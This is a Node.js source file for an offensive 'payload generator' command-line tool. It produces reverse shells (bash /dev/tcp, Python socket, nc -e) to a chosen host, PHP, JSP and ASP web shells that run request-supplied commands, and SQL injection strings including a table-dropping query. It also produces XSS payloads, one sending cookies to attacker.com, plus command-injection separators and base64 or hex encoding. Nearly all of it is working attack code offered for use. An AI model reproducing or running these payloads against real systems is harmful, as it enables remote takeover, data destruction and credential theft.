/**
 * Payload Generator
 * Generates various types of payloads for exploitation.
 */

const fs = require('fs');

class PayloadGenerator {
    constructor() {
        this.payloads = {};
    }

    generateReverseShell(host, port, shellType = 'bash') {
        let payload;
        if (shellType === 'bash') {
            payload = `bash -i >& /dev/tcp/${host}/${port} 0>&1`;
        } else if (shellType === 'python') {
            payload = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${host}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
        } else if (shellType === 'nc') {
            payload = `nc -e /bin/sh ${host} ${port}`;
        } else {
            payload = `bash -i >& /dev/tcp/${host}/${port} 0>&1`;
        }
        return payload;
    }

    generateWebShell(shellType = 'php') {
        const shells = {
            php: `<?php system($_GET['cmd']); ?>`,
            jsp: `<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %>`,
            asp: `<%eval request("cmd")%>`
        };
        return shells[shellType] || shells.php;
    }

    generateSQLPayload(payloadType = 'union') {
        const payloads = {
            union: "1' UNION SELECT NULL,NULL--",
            error: "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            blind: "1' AND 1=1--",
            time: "1' AND SLEEP(5)--",
            stacked: "1'; DROP TABLE users--"
        };
        return payloads[payloadType] || payloads.union;
    }

    generateXSSPayload(payloadType = 'alert') {
        const payloads = {
            alert: "<script>alert('XSS')</script>",
            img: "<img src=x onerror=alert('XSS')>",
            svg: "<svg onload=alert('XSS')>",
            body: "<body onload=alert('XSS')>",
            cookie: "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>"
        };
        return payloads[payloadType] || payloads.alert;
    }

    generateCommandInjection(command = 'id') {
        return [
            `; ${command}`,
            `| ${command}`,
            `&& ${command}`,
            `|| ${command}`,
            `` + `${command}` + ``,
            `$(${command})`,
            `; ${command} #`,
            `| ${command} #`
        ];
    }

    encodePayload(payload, encoding = 'base64') {
        if (encoding === 'base64') {
            return Buffer.from(payload).toString('base64');
        } else if (encoding === 'url') {
            return encodeURIComponent(payload);
        } else if (encoding === 'hex') {
            return Buffer.from(payload).toString('hex');
        }
        return payload;
    }

    generateAllPayloads(targetHost = '192.168.1.100', targetPort = 4444) {
        return {
            reverse_shell_bash: this.generateReverseShell(targetHost, targetPort, 'bash'),
            reverse_shell_python: this.generateReverseShell(targetHost, targetPort, 'python'),
            web_shell_php: this.generateWebShell('php'),
            web_shell_jsp: this.generateWebShell('jsp'),
            sql_union: this.generateSQLPayload('union'),
            sql_error: this.generateSQLPayload('error'),
            sql_blind: this.generateSQLPayload('blind'),
            sql_time: this.generateSQLPayload('time'),
            xss_alert: this.generateXSSPayload('alert'),
            xss_cookie: this.generateXSSPayload('cookie'),
            command_injection: this.generateCommandInjection('id')
        };
    }

    savePayloads(filename = 'payloads.txt') {
        const payloads = this.generateAllPayloads();
        let content = '# Generated Payloads\n\n';
        
        for (const [name, payload] of Object.entries(payloads)) {
            content += `## ${name}\n`;
            if (Array.isArray(payload)) {
                payload.forEach(p => {
                    content += `${p}\n`;
                });
            } else {
                content += `${payload}\n`;
            }
            content += '\n';
        }
        
        fs.writeFileSync(filename, content, 'utf8');
        console.log(`[+] Payloads saved to ${filename}`);
    }
}

function main() {
    const args = process.argv.slice(2);
    const generator = new PayloadGenerator();

    if (args.length > 0) {
        const payloadType = args[0];

        if (payloadType === 'reverse') {
            const host = args[1] || '192.168.1.100';
            const port = parseInt(args[2]) || 4444;
            console.log(generator.generateReverseShell(host, port));
        } else if (payloadType === 'webshell') {
            const shellType = args[1] || 'php';
            console.log(generator.generateWebShell(shellType));
        } else if (payloadType === 'sql') {
            const sqlType = args[1] || 'union';
            console.log(generator.generateSQLPayload(sqlType));
        } else if (payloadType === 'xss') {
            const xssType = args[1] || 'alert';
            console.log(generator.generateXSSPayload(xssType));
        } else {
            generator.savePayloads();
        }
    } else {
        generator.savePayloads();
        console.log('\n[+] Usage examples:');
        console.log('  node payload_generator.js reverse 192.168.1.100 4444');
        console.log('  node payload_generator.js webshell php');
        console.log('  node payload_generator.js sql union');
        console.log('  node payload_generator.js xss alert');
    }
}

if (require.main === module) {
    main();
}

module.exports = PayloadGenerator;

